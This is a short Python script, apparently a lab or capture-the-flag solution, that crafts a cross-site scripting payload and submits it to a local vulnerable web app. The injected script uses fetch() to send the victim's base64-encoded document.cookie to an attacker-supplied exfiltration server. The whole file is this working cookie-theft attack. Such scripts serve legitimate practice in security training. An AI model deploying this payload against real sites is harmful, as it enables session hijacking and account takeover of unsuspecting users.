import requests
from urllib.parse import quote_plus
import sys

if __name__ == "__main__" :
    if len(sys.argv) != 2 :
        print(f"usage : {sys.argv[0]} <exfil_server_url>")
        exit(1)
    TARGET = 'http://vulnerable_app:5000'
    EXFIL_SERVER = sys.argv[1]
    payload = f"<script>fetch('{EXFIL_SERVER}/?cookie='+btoa(document.cookie),{{method: 'GET',mode: 'no-cors'}}).then(x=>x.text());</script>"
    if __name__ == "__main__" :
        r = requests.get('http://localhost:5001' + '/', params={'value': '/?value=' + quote_plus(payload)})
        print(r.request.url)